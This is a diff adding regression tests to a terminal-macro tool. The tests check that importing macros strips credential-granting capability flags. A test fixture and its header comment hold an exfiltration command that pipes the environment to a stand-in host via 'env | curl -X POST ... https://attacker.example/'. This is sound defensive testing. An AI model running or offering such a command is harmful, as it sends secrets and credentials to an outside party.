@@ -372,3 +372,78 @@ describe("keyOf() separates macros by where they RUN (issue #48)", () => {
     expect(keyOf(corrupt)).toBe(keyOf(absent));
   });
 });
+
+/**
+ * Issue #48 §3.3 / §3.5 — CAPABILITY FLAGS NEVER CROSS AN INSTALLATION BOUNDARY.
+ *
+ * The vulnerability these guard: `sanitizeImportedMacro` starts from
+ * `{ ...raw }` and persists any field it was not explicitly taught to remove, so
+ * an imported macro carrying `provideIpmiCredentials: true` — with text as
+ * innocuous as `env | curl -X POST https://attacker/…` — would import ALREADY
+ * ARMED and its first run would hand over the fleet-wide BMC password with the
+ * importing user never having seen a checkbox.
+ *
+ * `route` is asserted alongside it even though nothing reads that field yet
+ * (PR-C): a capability flag stripped before it exists costs nothing, and one the
+ * sanitizer learns about afterwards costs a release.
+ */
+describe("imported macros — capability flags are stripped (issue #48 §3.3)", () => {
+  const HOSTILE: TerminalMacro = {
+    id: "hostile",
+    name: "Check BMC reachability",
+    // Innocuous-looking, uses an IPMI token, and exfiltrates the environment.
+    text: "ping -c1 ${profile.ipmiHost} && env | curl -X POST --data-binary @- https://attacker.example/\n",
+    runIn: "localTerminal",
+    provideIpmiCredentials: true,
+    route: "ipmiGateway"
+  } as TerminalMacro & { route: string };
+
+  it("backup import (collectIncomingMacros, v2) drops both flags", () => {
+    const result = collectIncomingMacros({ version: 2 as const, exportedAt: "", macros: [HOSTILE] });
+
+    expect(result).toBeDefined();
+    const imported = result!.macros[0] as TerminalMacro & { route?: unknown };
+    // ABSENCE, not falsiness: a `false` written by a future "normalize" step
+    // would pass a `!== true` assertion while a re-serialized record still
+    // carries a key the editor renders as an explicit choice.
+    expect("provideIpmiCredentials" in imported).toBe(false);
+    expect("route" in imported).toBe(false);
+    // Everything that is NOT a capability survives — the strip must not be a
+    // reason to lose the macro.
+    expect(imported.name).toBe("Check BMC reachability");
+    expect(imported.runIn).toBe("localTerminal");
+    expect(imported.text).toContain("${profile.ipmiHost}");
+  });
+
+  it("backup import (legacy v1 settings payload) drops them too — the sanitizer is shared, and that is the point", () => {
+    const result = collectIncomingMacros({
+      version: 1 as const,
+      exportedAt: "",
+      servers: [],
+      settings: { "nexus.terminal.macros": [HOSTILE] }
+    } as unknown as Parameters<typeof collectIncomingMacros>[0]);
+
+    const imported = result!.macros[0] as TerminalMacro & { route?: unknown };
+    expect("provideIpmiCredentials" in imported).toBe(false);
+    expect("route" in imported).toBe(false);
+  });
+
+  it("a stored `false` is dropped as well, so nothing re-exports a decision the importer never made", () => {
+    const result = collectIncomingMacros({
+      version: 2 as const,
+      exportedAt: "",
+      macros: [{ ...HOSTILE, provideIpmiCredentials: false } as TerminalMacro]
+    });
+
+    expect("provideIpmiCredentials" in result!.macros[0]).toBe(false);
+  });
+
+  it("the content key ignores the flags, so re-importing a stripped macro does not duplicate the local one", () => {
+    // The flags are deliberately NOT part of `keyOf`: they are stripped on
+    // import, so counting them would make an imported (stripped) macro fail to
+    // match the local flagged original and land as a second copy.
+    const local: TerminalMacro = { id: "l", name: "SOL", text: "ipmitool\n", runIn: "localTerminal", provideIpmiCredentials: true };
+    const incoming: TerminalMacro = { id: "i", name: "SOL", text: "ipmitool\n", runIn: "localTerminal" };
+    expect(keyOf(local)).toBe(keyOf(incoming));
+  });
+});
